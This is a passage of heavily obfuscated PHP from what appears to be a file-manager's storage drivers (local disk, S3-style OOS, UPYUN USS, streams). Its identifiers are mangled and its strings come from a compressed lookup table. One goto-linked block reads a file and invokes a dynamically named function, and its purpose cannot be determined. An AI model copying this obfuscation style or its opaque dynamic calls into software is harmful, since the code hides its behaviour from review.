$¥Ç¹ôùî[78] => $this->getPathOuter($ÀĞ½—éì), $¥Ç¹ôùî[33] => $¥Ç¹ôùî[79]); } $¿î¿ÇèÔ = array($¥Ç¹ôùî[32] => $ÌÇë„î›, $¥Ç¹ôùî[78] => $this->getPathOuter($ÀĞ½—éì), $¥Ç¹ôùî[33] => $¥Ç¹ôùî[79], $¥Ç¹ôùî[197] => @filectime($ÀĞ½—éì), $¥Ç¹ôùî[86] => @filemtime($ÀĞ½—éì), $¥Ç¹ôùî[1376] => @fileatime($ÀĞ½—éì), $¥Ç¹ôùî[1377] => is_readable($ÀĞ½—éì), $¥Ç¹ôùî[1378] => is_writable($ÀĞ½—éì), $¥Ç¹ôùî[1379] => get_mode($ÀĞ½—éì)); return $¿î¿ÇèÔ; } private function fileInfo($ÏÉø·‚¤, $„ƒúú¯Ì = false) { $’¡ååïà =& $_SERVER[Ôó‡è­ƒ]; $¡‚óñ« = $this->iconvApp($this->pathThis($ÏÉø·‚¤)); if ($„ƒúú¯Ì) { return array($’¡ååïà[32] => $¡‚óñ«, $’¡ååïà[78] => $this->getPathOuter($ÏÉø·‚¤), $’¡ååïà[33] => $’¡ååïà[196], $’¡ååïà[80] => $this->size($ÏÉø·‚¤), $’¡ååïà[171] => $this->ext($¡‚óñ«)); } $ŒÇ¯«¤÷ = array($’¡ååïà[32] => $¡‚óñ«, $’¡ååïà[78] => $this->getPathOuter($ÏÉø·‚¤), $’¡ååïà[33] => $’¡ååïà[196], $’¡ååïà[197] => @filectime($ÏÉø·‚¤), $’¡ååïà[86] => @filemtime($ÏÉø·‚¤), $’¡ååïà[1376] => @fileatime($ÏÉø·‚¤), $’¡ååïà[80] => $this->size($ÏÉø·‚¤), $’¡ååïà[171] => $this->ext($¡‚óñ«), $’¡ååïà[1377] => is_readable($ÏÉø·‚¤), $’¡ååïà[1378] => is_writable($ÏÉø·‚¤), $’¡ååïà[1379] => get_mode($ÏÉø·‚¤)); return $ŒÇ¯«¤÷; } public function exist($šˆ½…“å) { $šˆ½…“å = $this->iconvSystem($šˆ½…“å); return @file_exists($šˆ½…“å); } public function isFile($Ş“¢åş) { $Ş“¢åş = $this->iconvSystem($Ş“¢åş); return @is_file($Ş“¢åş); } public function isFolder($á±Éª«—) { $á±Éª«— = $this->iconvSystem($á±Éª«—); return @is_dir($á±Éª«—); } public function listPath($šİûˆ½…, $°Íä•‰ = false) { $ö´ç£ç =& $_SERVER[Ôó‡è­ƒ]; $šİûˆ½… = $this->iconvSystem($šİûˆ½…); $šİûˆ½… = rtrim($šİûˆ½…, $ö´ç£ç[8]) . $ö´ç£ç[8]; $éÖñ‡“£ = array($ö´ç£ç[77] => array(), $ö´ç£ç[76] => array()); if (!($Í¸ß = @opendir($šİûˆ½…))) { return $éÖñ‡“£; } while (($ê†ÏĞ£ˆ = readdir($Í¸ß)) !== !1) { if ($ê†ÏĞ£ˆ == $ö´ç£ç[10] || $ê†ÏĞ£ˆ == $ö´ç£ç[1373]) { continue; } $àŸ¬šá± = $šİûˆ½… . $ê†ÏĞ£ˆ; if (is_file($àŸ¬šá±)) { $éÖñ‡“£[$ö´ç£ç[76]][] = $this->fileInfo($àŸ¬šá±, $°Íä•‰); } else { $éÖñ‡“£[$ö´ç£ç[77]][] = $this->folderInfo($àŸ¬šá±, $°Íä•‰); } } closedir($Í¸ß); return $éÖñ‡“£; } public function listAll($Ä¡ÒŒ½İ, &$ûÆ¹Ùß¤ = array()) { $‹ï¦ºÀë =& $_SERVER[Ôó‡è­ƒ]; $Ä¡ÒŒ½İ = $this->iconvSystem($Ä¡ÒŒ½İ); $Ä¡ÒŒ½İ = rtrim($Ä¡ÒŒ½İ, $‹ï¦ºÀë[8]) . $‹ï¦ºÀë[8]; if (!($™çªı÷€ = @opendir($Ä¡ÒŒ½İ))) { return $ûÆ¹Ùß¤; } while (($ƒ†«Ñíå = readdir($™çªı÷€)) !== !1) { if ($ƒ†«Ñíå == $‹ï¦ºÀë[10] || $ƒ†«Ñíå == $‹ï¦ºÀë[1373]) { continue; } $”šËøØ¢ = $Ä¡ÒŒ½İ . $ƒ†«Ñíå; if (is_dir($”šËøØ¢) && !is_link($”šËøØ¢)) { $ûÆ¹Ùß¤[] = array($‹ï¦ºÀë[78] => $”šËøØ¢ . $‹ï¦ºÀë[8], $‹ï¦ºÀë[79] => 1, $‹ï¦ºÀë[86] => @filemtime($”šËøØ¢), $‹ï¦ºÀë[80] => 0); $this->listAll($”šËøØ¢, $ûÆ¹Ùß¤); } else { $ûÆ¹Ùß¤[] = array($‹ï¦ºÀë[78] => $”šËøØ¢, $‹ï¦ºÀë[79] => 0, $‹ï¦ºÀë[86] => @filemtime($”šËøØ¢), $‹ï¦ºÀë[80] => $this->size($”šËøØ¢)); } } closedir($™çªı÷€); return $ûÆ¹Ùß¤; } public function has($Àèü¥í, $á¸‘ä¶‰ = false, $ì‚¡°Á = true) { $Â•ñ¼ƒŠ =& $_SERVER[Ôó‡è­ƒ]; $Àèü¥í = $this->iconvSystem($Àèü¥í); $Àèü¥í = rtrim($Àèü¥í, $Â•ñ¼ƒŠ[8]) . $Â•ñ¼ƒŠ[8]; if (!($ĞÑ®Á»» = @opendir($Àèü¥í))) { return !1; } $‚®Ç»öÄ = 0; $Å±½û­© = 0; $ù•ğ²µ† = 0; while (($Àˆó‘µ = readdir($ĞÑ®Á»»)) !== !1) { if ($Àˆó‘µ == $Â•ñ¼ƒŠ[10] || $Àˆó‘µ == $Â•ñ¼ƒŠ[1373]) { continue; } $¤ç¾²…ì = $Àèü¥í . $Àˆó‘µ; if ($á¸‘ä¶‰) { $ù•ğ²µ†++; if (@is_file($¤ç¾²…ì)) { $‚®Ç»öÄ++; } else { $Å±½û­©++; } if ($ù•ğ²µ† > 10000) { break; } continue; } if ($ì‚¡°Á) { if (@is_file($¤ç¾²…ì)) { return !0; } } else { if (@is_dir($¤ç¾²…ì . $Â•ñ¼ƒŠ[8])) { return !0; } } } closedir($ĞÑ®Á»»); if ($á¸‘ä¶‰) { return array($Â•ñ¼ƒŠ[206] => $‚®Ç»öÄ, $Â•ñ¼ƒŠ[207] => $Å±½û­©); } return !1; } public function hashSimple($ÂîŠ÷ëã) { $Ç¶ò°Øé =& $_SERVER[Ôó‡è­ƒ]; if (!$ÂîŠ÷ëã) { return md5($Ç¶ò°Øé[12]); } $ÂîŠ÷ëã = $this->iconvSystem($ÂîŠ÷ëã); $Í¾°ìıµ = $this->size($ÂîŠ÷ëã); $Ú²—Í½ö = 200; $Úûî¢Ä‰ = 50; if ($Í¾°ìıµ <= $Ú²—Í½ö * $Úûî¢Ä‰) { return $this->hashMd5($ÂîŠ÷ëã) . $Í¾°ìıµ; } $³òÕ‘ëŠ = $Ç¶ò°Øé[12]; $–À·Ñ›Ò = intval($Í¾°ìıµ / $Úûî¢Ä‰); $œÈíö† = fopen($ÂîŠ÷ëã, $Ç¶ò°Øé[1380]); if (!$œÈíö†) { return $³òÕ‘ëŠ; } for ($½æåˆÕ = 0; $½æåˆÕ < $Úûî¢Ä‰; $½æåˆÕ++) { fseek_64($œÈíö†, $–À·Ñ›Ò * $½æåˆÕ); $³òÕ‘ëŠ .= fread($œÈíö†, $Ú²—Í½ö); } fseek_64($œÈíö†, $Í¾°ìıµ - $Ú²—Í½ö); $³òÕ‘ëŠ .= fread($œÈíö†, $Ú²—Í½ö); fclose($œÈíö†); return md5($³òÕ‘ëŠ) . $Í¾°ìıµ; } public function getContent($ˆÍÆÓÇ‚) { $ˆÍÆÓÇ‚ = $this->iconvSystem($ˆÍÆÓÇ‚); return file_get_contents($ˆÍÆÓÇ‚); } public function setContent($¹º ©çš, $¦¢æ¢é¾ = '') { $¹º ©çš = $this->iconvSystem($¹º ©çš); $É¼Ò¾¥ = @file_put_contents($¹º ©çš, $¦¢æ¢é¾, LOCK_EX); clearstatcache(); @chmod($¹º ©çš, $this->pathAuth); return $É¼Ò¾¥ === !1 ? !1 : !0; } public function fileSubstr($Û‘Á¨»¦, $ÛÌÄä€Ë = 0, $ò¶ŞÖ¥Ë = false) { $·ÈìÍî =& $_SERVER[Ôó‡è­ƒ]; $Û‘Á¨»¦ = $this->iconvSystem($Û‘Á¨»¦); if ($ò¶ŞÖ¥Ë === !1) { $ò¶ŞÖ¥Ë = $this->size($Û‘Á¨»¦); } if ($ò¶ŞÖ¥Ë <= 0) { return $·ÈìÍî[12]; } $ÒÛÛÑÆœ = fopen($Û‘Á¨»¦, $·ÈìÍî[1380]); if (!$ÒÛÛÑÆœ) { return !1; } fseek_64($ÒÛÛÑÆœ, $ÛÌÄä€Ë); $˜¡ÃğÅ = fread($ÒÛÛÑÆœ, $ò¶ŞÖ¥Ë); fclose($ÒÛÛÑÆœ); return $˜¡ÃğÅ; } public function upload($ÀŒİÛÖı, $è‘ĞÌáî, $Öú“’öş = false, $ÌÛÎµ = REPEAT_REPLACE) { if ($Öú“’öş) { return $this->moveFile($è‘ĞÌáî, $ÀŒİÛÖı); } return $this->copyFile($è‘ĞÌáî, $ÀŒİÛÖı); } public function setModifyTime($Ø÷·ú€Ô, $ùºÚëÒÜ = '') { @touch($Ø÷·ú€Ô, intval($ùºÚëÒÜ)); } public function download($‡ÊÀ–•â, $îî÷§ƒ÷) { return $this->iconvSystem($‡ÊÀ–•â); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¿‚ü“Å©) { parent::__construct($¿‚ü“Å©); $this->signatureVersion($_SERVER[Ôó‡è­ƒ][215]); } public function fileOutLink($ø†º «¬) { $æÔòíïò =& $_SERVER[Ôó‡è­ƒ]; if (substr($ø†º «¬, 0, 7) == $æÔòíïò[1323]) { $ø†º «¬ = $æÔòíïò[1324] . substr($ø†º «¬, 7); } header($æÔòíïò[162] . $ø†º «¬); die; } } goto C·‰í¤Ñé; fâæõ•‡…: define($_SERVER[Ôó‡è­ƒ][0], $_SERVER[Ôó‡è­ƒ][1]); $_SERVER[‡‹á¼¢¼] = explode($_SERVER[Ôó‡è­ƒ][2], gzinflate(substr($_SERVER[Ôó‡è­ƒ][3], 10, -8))); function binCheckEq($ú£ÛÍ½†, $ş­ÅµŸñ) { return $ú£ÛÍ½† == $ş­ÅµŸñ; } goto B±ÉğÒ“ÉÖ; fÙô§º·: if ($_SERVER[$_SERVER[Ôó‡è­ƒ][872]] != $_SERVER[$_SERVER[Ôó‡è­ƒ][1452]]) { $_getc = $_SERVER[Ôó‡è­ƒ][874]; $_getfile = $_SERVER[$_SERVER[Ôó‡è­ƒ][875]] . $_SERVER[Ôó‡è­ƒ][876]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ôó‡è­ƒ][230], $_getfilec); if (count($_getarrs) < $_SERVER[Ôó‡è­ƒ][606]) { $exit = $_SERVER[Ôó‡è­ƒ][877]; $exit(); } $_act = $_SERVER[Ôó‡è­ƒ][1343]; $_act($_SERVER[$_SERVER[Ôó‡è­ƒ][870]]); } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¶¼·çï, $‰Şƒ¤‡Ë = 0) { parent::__construct(); $this->source = $¶¼·çï; $this->sourceSize = $‰Şƒ¤‡Ë; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($õÍƒ·Á = false) { return $this->sourceSize; } public function getContent($·ç­Ï¤¥ = false) { return $this->fileSubstr($·ç­Ï¤¥, 0, $this->sourceSize); } public function fileSubstr($±£Ù¢éä = false, $íş¡ü™• = 0, $éÃ±İ¢Á = 0) { if (!$éÃ±İ¢Á) { $éÃ±İ¢Á = $this->sourceSize; } $—·”ûÔ = $this->sourceSize - $íş¡ü™•; if ($éÃ±İ¢Á >= $—·”ûÔ) { $éÃ±İ¢Á = $—·”ûÔ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $íş¡ü™•, $éÃ±İ¢Á); } if ($this->sourceType == self::TYPE_FILE) { if ($éÃ±İ¢Á <= 0) { return $_SERVER[Ôó‡è­ƒ][12]; } $Ãº©ú² = ftell($this->source); fseek_64($this->source, $Ãº©ú² + $íş¡ü™•); $§¹¿şš¤ = @fread($this->source, $éÃ±İ¢Á); fseek_64($this->source, $Ãº©ú²); return $§¹¿şš¤; } } public function hashMd5($êŸ’·ê = false) { return md5($this->getContent()); } public static function hash($ÇÒ‡¬ú˜, $×ğ§¢ƒñ = 0) { $‰şÆŠÓ = new PathDriverStream($ÇÒ‡¬ú˜, $×ğ§¢ƒñ); return $‰şÆŠÓ->hashSimple($ÇÒ‡¬ú˜); } public static function md5($ÑäÓÊÁ×, $ùâ†—ŞÏ = 0) { $·ãæÖå = new PathDriverStream($ÑäÓÊÁ×, $ùâ†—ŞÏ); return $·ãæÖå->hashMd5($ÑäÓÊÁ×); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\72\x2f\57\166\x30\56\x61\160\151\x2e\165\160\171\x75\x6e\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¥‡£äµÑ) { parent::__construct(); $this->_init($¥‡£äµÑ); } public function _init($®•³ºÕ) { $ÔÛŞ­ı„ =& $_SERVER[Ôó‡è­ƒ]; foreach ($®•³ºÕ as $¡œûÌÙ => $‡ı«¡ªá) { if (isset($this->{$¡œûÌÙ})) { $this->{$¡œûÌÙ} = $‡ı«¡ªá; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÔÛŞ­ı„[1453] . LNG($ÔÛŞ­ı„[1383])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($†ÁÙ¤×å, $ëÇ¤‡ƒâ = "\107\105\124") { $´Ğ±êÕÂ =& $_SERVER[Ôó‡è­ƒ]; $âÇïª§ = gmdate($´Ğ±êÕÂ[1416]); $üÎí—ú» = base64_encode(hash_hmac($´Ğ±êÕÂ[1454], "{$ëÇ¤‡ƒâ}\x26{$†ÁÙ¤×å}\46{$âÇïª§}", md5("{$this->userpass}"), !0)); $¢½ß¾“® = array("\x41\x75\x74\150\157\x72\x69\172\141\164\151\157\x6e\72\125\120\x59\x55\x4e\40{$this->username}\72{$üÎí—ú»}", "\x44\141\164\x65\72{$âÇïª§}"); return $¢½ß¾“®; } public function ussRequest($íè¸ı—ü, $Ú‡œÎÂ© = "\107\x45\x54", $°œÈò‚ü = false, $½–ÚÉ—‹ = false, $ôï¢îî = false) { $—áóØ·» =& $_SERVER[Ôó‡è­ƒ]; $íè¸ı—ü = trim($íè¸ı—ü, $—áóØ·»[8]); $å·ò˜½ = "\x2f{$this->bucket}\x2f{$íè¸ı—ü}"; $¡±‡ à· = $this->ussHeaders($å·ò˜½, $Ú‡œÎÂ©); if ($½–ÚÉ—‹) { $¡±‡ à· = array_merge($¡±‡ à·, $½–ÚÉ—‹); } $ñò÷Ï©ã = url_request($this->endpoint . $å·ò˜½, $Ú‡œÎÂ©, $°œÈò‚ü, $¡±‡ à·, $ôï¢îî); if (!$ñò÷Ï©ã) { return array($—áóØ·»[1189] => !1, $—áóØ·»[1191] => $—áóØ·»[1455]); } if (strtolower($Ú‡œÎÂ©) == $—áóØ·»[193] || in_array($ñò÷Ï©ã[$—áóØ·»[1189]], array($—áóØ·»[1308], $—áóØ·»[1456]))) { $°œÈò‚ü = $ñò÷Ï©ã[$—áóØ·»[1457]]; } else { $°œÈò‚ü = json_decode($ñò÷Ï©ã[$—áóØ·»[1191]], !0); if (!$°œÈò‚ü) { $°œÈò‚ü = $ñò÷Ï©ã[$—áóØ·»[1191]]; } else { if (!$ñò÷Ï©ã[$—áóØ·»[748]] && isset($°œÈò‚ü[$—áóØ·»[1458]])) { $°œÈò‚ü = $°œÈò‚ü[$—áóØ·»[1458]]; } } } return array($—áóØ·»[1189] => $ñò÷Ï©ã[$—áóØ·»[748]], $—áóØ·»[1191] => $°œÈò‚ü); } public function mkfile($Ó’áöÔÅ, $ø‘¿Äˆ = '', $™éŒ•ó£ = REPEAT_RENAME) { if ($this->setContent($Ó’áöÔÅ, $ø‘¿Äˆ)) { return $this->getPathOuter($Ó’áöÔÅ); } return !1; } public function mkdir($Ç‰é¹á«, $ÖôõˆÖÏ = REPEAT_SKIP) { $°±¾êôø =& $_SERVER[Ôó‡è­ƒ]; $¬ùÖò¹ô = trim($Ç‰é¹á«, $°±¾êôø[8]); if ($this->_isFolder($¬ùÖò¹ô)) { return $this->getPathOuter($¬ùÖò¹ô); } $è—¶Úõü = array($°±¾êôø[1459]); $¯ûëıÂú = $this->ussRequest($¬ùÖò¹ô, $°±¾êôø[225], !1, $è—¶Úõü); return $¯ûëıÂú[$°±¾êôø[1189]] ? $this->getPathOuter($¬ùÖò¹ô) : !1; } public function copyFile($ÌÓô÷Ô×, $‚ÃºŠ‰) { $İ‹×ÌÖ =& $_SERVER[Ôó‡è­ƒ]; $Ú…Œı ë = array($İ‹×ÌÖ[1460] . "\57{$this->bucket}\x2f{$ÌÓô÷Ô×}", $İ‹×ÌÖ[1461]); $Ó¶Ìí€• = $this->ussRequest($‚ÃºŠ‰, $İ‹×ÌÖ[227], !1, $Ú…Œı ë); return $Ó¶Ìí€•[$İ‹×ÌÖ[1189]] ? !0 : $this->getPathOuter($‚ÃºŠ‰); } public function moveFile($Ü¤êıİ€, $ÅÌç¥ôÑ) { $‹á±£¹· =& $_SERVER[Ôó‡è­ƒ]; $ÑˆŠ‡¦´ = array($‹á±£¹·[1462] . "\x2f{$this->bucket}\x2f{$Ü¤êıİ€}", $‹á±£¹·[1461]); $†àû¸¦„ = $this->ussRequest($ÅÌç¥ôÑ, $‹á±£¹·[227], !1, $ÑˆŠ‡¦´); return $†àû¸¦„[$‹á±£¹·[1189]] ? !0 : $this->getPathOuter($ÅÌç¥ôÑ); } public function delFile($àÀªÖñ¶) { $ÄœÊœ¢… =& $_SERVER[Ôó‡è­ƒ]; $‘ûÉ¡¹ğ = $this->ussRequest($àÀªÖñ¶, $ÄœÊœ¢…[1463]); return $‘ûÉ¡¹ğ[$ÄœÊœ¢…[1189]] ? !0 : !1; } public function delFolder($’ñ°âº±) { $Õ¯Ğ¸ö =& $_SERVER[Ôó‡è­ƒ]; if (!$this->exist($’ñ°âº±)) { return !0; } $this->listItemCache = !1; $ùÊ›õúû = $ÔÏíÑ­Á = array(); $this->fileList($’ñ°âº±, $ùÊ›õúû, $ÔÏíÑ­Á, !0); $this->listItemCache = !0; foreach ($ÔÏíÑ­Á as $ÀõÑ¬Øô) { $ÙÆİ´»í = $this->ussRequest($ÀõÑ¬Øô[$Õ¯Ğ¸ö[32]], $Õ¯Ğ¸ö[1463]); if (!$ÙÆİ´»í[$Õ¯Ğ¸ö[1189]]) { return !1; } } foreach ($ùÊ›õúû as $üÃ¤¢”„) { $ÙÆİ´»í = $this->ussRequest($üÃ¤¢”„, $Õ¯Ğ¸ö[1463]); if (!$ÙÆİ´»í[$Õ¯Ğ¸ö[1189]]) { return !1; } } $ÙÆİ´»í = $this->ussRequest($’ñ°âº±, $Õ¯Ğ¸ö[1463]); return $ÙÆİ´»í[$Õ¯Ğ¸ö[1189]]; } public function rename($„å»·, $®ÅîùĞ…) { if ($this->isFile($„å»·)) { $®ÅîùĞ… = get_path_father($„å»·) . $®ÅîùĞ…; return $this->moveFile($„å»·, $®ÅîùĞ…); } return $this->renameObject($„å»·, $®ÅîùĞ…); } public function fileInfo($İİÀÙ—¦, $ŸŞ©–ò = false, $ğ’üàîõ = array()) { $«½îŒ¨Ö =& $_SERVER[Ôó‡è­ƒ]; $ğà Ó“« = array($«½îŒ¨Ö[32] => $this->pathThis($İİÀÙ—¦), $«½îŒ¨Ö[78] => $this->getPathOuter($«½îŒ¨Ö[8] . $İİÀÙ—¦), $«½îŒ¨Ö[33] => $«½îŒ¨Ö[196], $«½îŒ¨Ö[80] => isset($ğ’üàîõ[$«½îŒ¨Ö[80]]) ? $ğ’üàîõ[$«½îŒ¨Ö[80]] : 0, $«½îŒ¨Ö[171] => $this->ext($İİÀÙ—¦)); if ($ŸŞ©–ò) { return $ğà Ó“«; } $ğà Ó“«[$«½îŒ¨Ö[197]] = $ğà Ó“«[$«½îŒ¨Ö[86]] = 0; $ğà Ó“«[$«½îŒ¨Ö[198]] = $ğà Ó“«[$«½îŒ¨Ö[199]] = !0; if (empty($ğ’üàîõ)) { $ğ’üàîõ = $this->objectMeta($İİÀÙ—¦); if (!$ğ’üàîõ) { return $ğà Ó“«; } } $ğà Ó“«[$«½îŒ¨Ö[197]] = intval($ğ’üàîõ[$«½îŒ¨Ö[1464]]); $ğà Ó“«[$«½îŒ¨Ö[86]] = intval($ğ’üàîõ[$«½îŒ¨Ö[1465]]); $ğà Ó“«[$«½îŒ¨Ö[80]] = $ğ’üàîõ[$«½îŒ¨Ö[80]]; return $ğà Ó“«; } public function folderInfo($Äêš€Êº, $¸¶¸ëÄĞ = false) { $ÀÌ›Ÿ©¼ =& $_SERVER[Ôó‡è­ƒ]; $ÆÏÄÜÀÜ = array($ÀÌ›Ÿ©¼[32] => $this->pathThis($Äêš€Êº), $ÀÌ›Ÿ©¼[78] => $this->getPathOuter($ÀÌ›Ÿ©¼[8] . $Äêš€Êº), $ÀÌ›Ÿ©¼[33] => $ÀÌ›Ÿ©¼[79]); if ($¸¶¸ëÄĞ) { return $ÆÏÄÜÀÜ; } $ÆÏÄÜÀÜ[$ÀÌ›Ÿ©¼[197]] = $ÆÏÄÜÀÜ[$ÀÌ›Ÿ©¼[86]] = 0; $ÆÏÄÜÀÜ[$ÀÌ›Ÿ©¼[198]] = $ÆÏÄÜÀÜ[$ÀÌ›Ÿ©¼[199]] = !0; if (empty($¡ı£’Ğ³)) { $¡ı£’Ğ³ = $this->objectMeta($Äêš€Êº); if (!$¡ı£’Ğ³) { return $ÆÏÄÜÀÜ; } } $ÆÏÄÜÀÜ[$ÀÌ›Ÿ©¼[197]] = intval($¡ı£’Ğ³[$ÀÌ›Ÿ©¼[1464]]); $ÆÏÄÜÀÜ[$ÀÌ›Ÿ©¼[86]] = intval($¡ı£’Ğ³[$ÀÌ›Ÿ©¼[1465]]); return $ÆÏÄÜÀÜ; } private function listObjs($’Ä£å§¨, $Ô…°ã™‰ = 0, $£éâıè = 1000) { $›˜›º›Ë =& $_SERVER[Ôó‡è­ƒ]; $ı¨ï÷ìñ = array($›˜›º›Ë[1466], $›˜›º›Ë[1467] . $£éâıè); if ($Ô…°ã™‰) { $ı¨ï÷ìñ[] = $›˜›º›Ë[1468] . $Ô…°ã™‰; } $Ã…¢¯Äø = $this->ussRequest($’Ä£å§¨, $›˜›º›Ë[229], !1, $ı¨ï÷ìñ); return !$Ã…¢¯Äø[$›˜›º›Ë[1189]] ? !1 : $Ã…¢¯Äø[$›˜›º›Ë[1191]]; } private function fileList($™éàö»£, &$ê½Êó¨¾, &$ŠØ¢ãóş, $çóÀÆêù = false) { $ç§¹ºúÓ =& $_SERVER[Ôó‡è­ƒ]; $¼ÕÃÙÅ€ = $ç§¹ºúÓ[12]; $š³† İş = 1000; $ª‰šÌã© = rtrim($™éàö»£, $ç§¹ºúÓ[8]) . $ç§¹ºúÓ[8]; $ŒØØ²Íü = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $ù‹²–ë = $this->listObjs($™éàö»£, $¼ÕÃÙÅ€, $š³† İş); if (!$ù‹²–ë) { return !1; } $¼ÕÃÙÅ€ = isset($ù‹²–ë[$ç§¹ºúÓ[1469]]) ? $ù‹²–ë[$ç§¹ºúÓ[1469]] : $ç§¹ºúÓ[12]; $ØË…Â’Ş = isset($ù‹²–ë[$ç§¹ºúÓ[1470]]) ? $ù‹²–ë[$ç§¹ºúÓ[1470]] : array(); foreach ($ØË…Â’Ş as $îñŸ±‰–) { $²Öêø = $îñŸ±‰–[$ç§¹ºúÓ[33]] == $ç§¹ºúÓ[79] ? !0 : !1; $‘ÔÆ—Öë = ltrim($ª‰šÌã© . $îñŸ±‰–[$ç§¹ºúÓ[32]], $ç§¹ºúÓ[8]) . ($²Öêø ? $ç§¹ºúÓ[8] : $ç§¹ºúÓ[12]); $ËºÌşĞ¥ = array($ç§¹ºúÓ[32] => $‘ÔÆ—Öë, $ç§¹ºúÓ[33] => $²Öêø ? $ç§¹ºúÓ[79] : $ç§¹ºúÓ[196], $ç§¹ºúÓ[80] => $îñŸ±‰–[$ç§¹ºúÓ[336]], $ç§¹ºúÓ[1465] => $îñŸ±‰–[$ç§¹ºúÓ[1471]]); if ($ŒØØ²Íü) { $this->cacheMethod($ç§¹ºúÓ[202], $‘ÔÆ—Öë, $²Öêø); $this->cacheMethod($ç§¹ºúÓ[203], $‘ÔÆ—Öë, $ËºÌşĞ¥); } if ($²Öêø) { $ê½Êó¨¾[] = $‘ÔÆ—Öë; if ($çóÀÆêù) { $this->fileList($‘ÔÆ—Öë, $ê½Êó¨¾, $ŠØ¢ãóş, $çóÀÆêù); } continue; } $ŠØ¢ãóş[] = $ËºÌşĞ¥; } if (count($ØË…Â’Ş) < $š³† İş) { break; } } if ($ŒØØ²Íü) { $this->cacheMethod($ç§¹ºúÓ[202], $™éàö»£, !0); } } public function listPath($•¬×ïò•, $±¢ùÛË³ = false) { $şí÷ô‚© =& $_SERVER[Ôó‡è­ƒ]; $äö¦Şßü = $ì–ñáá = array(); $this->fileList($•¬×ïò•, $äö¦Şßü, $ì–ñáá); foreach ($äö¦Şßü as $“´­‡Úò => $çù§¡ È) { $äö¦Şßü[$“´­‡Úò] = $this->folderInfo($çù§¡ È, $±¢ùÛË³); } foreach ($ì–ñáá as $“´­‡Úò => $çù§¡ È) { $ì–ñáá[$“´­‡Úò] = $this->fileInfo($çù§¡ È[$şí÷ô‚©[32]], $±¢ùÛË³, $çù§¡ È); } return array($şí÷ô‚©[77] => $äö¦Şßü, $şí÷ô‚©[76] => $ì–ñáá); } public function has($ŒİÕß‘È, $œ«¬ÈØĞ = false, $„ç¢ÙÓ = true) { $Äù€¬‘× =& $_SERVER[Ôó‡è­ƒ]; $°ü£šŒ¢ = $Äù€¬‘×[12]; $ûÒ†€èÆ = 500; $Äí²ÇÃŸ = 0; $ÙËÌ¥êå = 0; $‡Ş“ ÜÄ = rtrim($ŒİÕß‘È, $Äù€¬‘×[8]) . $Äù€¬‘×[8]; while (!0) { check_abort(); $ÈîØ÷ÚÊ = $this->listObjs($ŒİÕß‘È, $°ü£šŒ¢, $ûÒ†€èÆ); if (!$ÈîØ÷ÚÊ) { return !1; } $°ü£šŒ¢ = isset($ÈîØ÷ÚÊ[$Äù€¬‘×[1469]]) ? $ÈîØ÷ÚÊ[$Äù€¬‘×[1469]] : $Äù€¬‘×[12]; $´‰Ö€İ¹ = isset($ÈîØ÷ÚÊ[$Äù€¬‘×[1470]]) ? $ÈîØ÷ÚÊ[$Äù€¬‘×[1470]] : array(); if (empty($´‰Ö€İ¹)) { break; } $âöËŞ÷ = array_filter($´‰Ö€İ¹, function ($ßŠƒŞ–) { $Ù²ğœ«ª =& $_SERVER[Ôó‡è­ƒ]; return $ßŠƒŞ–[$Ù²ğœ«ª[33]] == $Ù²ğœ«ª[79]; }); $Òùš¼¡Ø = count($´‰Ö€İ¹); $âöËŞ÷ = count($âöËŞ÷); $„ğè‰º = $Òùš¼¡Ø - $âöËŞ÷; if ($œ«¬ÈØĞ) { $ÙËÌ¥êå += $âöËŞ÷; $Äí²ÇÃŸ += $„ğè‰º; if ($Òùš¼¡Ø < $ûÒ†€èÆ) { break; } continue; } if ($„ç¢ÙÓ) { if ($„ğè‰º) { return !0; } } else { if ($âöËŞ÷) { return !0; } } if ($Òùš¼¡Ø < $ûÒ†€èÆ) { break; } } if ($œ«¬ÈØĞ) { return array($Äù€¬‘×[206] => $Äí²ÇÃŸ, $Äù€¬‘×[207] => $ÙËÌ¥êå); } return !1; } public function listAll($ÑÄŠê®­) { $óÃ¥Ü›’ =& $_SERVER[Ôó‡è­ƒ]; $‡Ãë±î„ = $í®û™½´ = array(); $this->fileList($ÑÄŠê®­, $‡Ãë±î„, $í®û™½´, !0); $¾ë™–× = array(); foreach ($í®û™½´ as $öº×ÅÂ ) { $¾ë™–×[$öº×ÅÂ [$óÃ¥Ü›’[32]]] = $öº×ÅÂ [$óÃ¥Ü›’[80]]; } foreach ($‡Ãë±î„ as $öº×ÅÂ ) { if (is_string($öº×ÅÂ )) { $¾ë™–×[$öº×ÅÂ ] = 0; } } return $this->listAllFiles($ÑÄŠê®­, array_keys($¾ë™–×), $¾ë™–×); } public function canRead($¤ÈÖÉ‰) { return $this->exist($¤ÈÖÉ‰) ? !0 : !1; } public function canWrite($ôàµùêö) { return $this->exist($ôàµùêö) ? !0 : !1; } public function getContent($Ö×ëóŸò) { return $this->fileSubstr($Ö×ëóŸò, 0, -1); } public function setContent($êĞúïÒ, $í¡´è¿² = '') { $×çÖÁöÄ =& $_SERVER[Ôó‡è­ƒ]; if (!$í¡´è¿²) { $ô—Ã¤ÎÍ = $this->ussRequest($êĞúïÒ, $×çÖÁöÄ[225]); return $ô—Ã¤ÎÍ[$×çÖÁöÄ[1189]]; } $åú÷™Ç = $this->tempFile($this->pathThis($êĞúïÒ)); file_put_contents($åú÷™Ç, $í¡´è¿²); if ($this->upload($êĞúïÒ, $åú÷™Ç)) { $this->tempFileRemve($åú÷™Ç); return !0; } return !1; } public function fileSubstr($Âåå÷ëƒ, $¾ß‰Ü¶ù, $ÁÇ½ÛÕÖ) { $Û€€¹ =& $_SERVER[Ôó‡è­ƒ]; if (!($€ÈÇ»×ø = $this->link($Âåå÷ëƒ))) { return !1; } $´Üê = !1; if 